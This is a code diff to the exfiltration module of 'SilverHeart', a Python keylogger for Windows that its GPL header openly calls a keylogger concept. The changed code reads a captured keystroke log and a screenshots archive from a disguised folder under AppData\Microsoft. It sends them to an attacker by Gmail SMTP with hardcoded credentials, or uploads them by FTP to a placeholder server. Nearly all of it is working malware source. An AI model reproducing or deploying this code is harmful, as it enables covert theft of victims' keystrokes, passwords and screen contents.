@@ -1,5 +1,23 @@
+""" A software fully developed in Python 3.7, SilverHeart is a keylogger concept, that can be deployed in Windows. (Mac OS and Linux distributions support will be added soon).
+    Copyright (C) 2020 Pedro Vieira
+
+    This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <https://www.gnu.org/licenses/>. 
+"""
+
 import ftplib
 import os
+import shutil
 import smtplib
 from email import encoders
 from email.mime.base import MIMEBase
@@ -7,31 +25,29 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 Directory = 'C:\\Users\\' + \
-    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
+            os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
 
 
 class sender:
-
-    def Email():
+    def byEmail():
 
         try:
             user = 'origin@company.com'
-            to = "destination@company.com"
+            to = "detination@company.com"
             pswrd = "password"
 
             msg = MIMEMultipart()
 
             msg["From:"] = user
             msg["To"] = to
-            msg["Subject"] = 'OMG Super Important Message :O'
-            body = 'Hey, what up \n'
+            msg["Subject"] = 'Logs'
+            body = 'Hey, what up sending u logs \n'
             body1 = 'ZIP attachments'
 
             # Defines the LOG file that is supposed to be sent
             msg.attach(MIMEText(body, "plain"))
-            filename = "Filename.txt"
-            attachment = open(
-                Directory + 'Keys.log', "rb")
+            filename = "Keys.log"
+            attachment = open(Directory + 'Keys.log', "rb")
 
             # Defines the ZIP screenshots file that is supposed to be sent
             msg.attach(MIMEText(body1, "plain"))
@@ -56,11 +72,13 @@ class sender:
             msg.attach(part)
             msg.attach(part1)
 
-            server = smtplib.SMTP_SSL('smtp.gmail.com',  # gmail, 465
-                                      465)  # using smtplib.SMTP_SSL instead to ensure secure connection
+            server = smtplib.SMTP_SSL(
+                'smtp.gmail.com',  # gmail (SMTP_SSL) port 465
+                465
+            )  # using smtplib.SMTP_SSL instead to ensure secure connection
 
             # server.ehlo() <- command to create a insecure connection
-            # server.starttls() <- make the connection secure (Google doesn't support this method)
+            # server.starttls() <- make the connection secure  (starttls port 587)
 
             server.login(user, pswrd)
             Text = msg.as_string()
@@ -75,7 +93,7 @@ class sender:
         else:
             print("Email Sent")
 
-    def FTP():
+    def byFTP():
         session = ftplib.FTP('server.address.com', 'USERNAME', 'PASSWORD')
         file = open(Directory + 'Keys.log')  # LOG to send
         session.storbinary('STOR Keys.log', file)  # send LOG
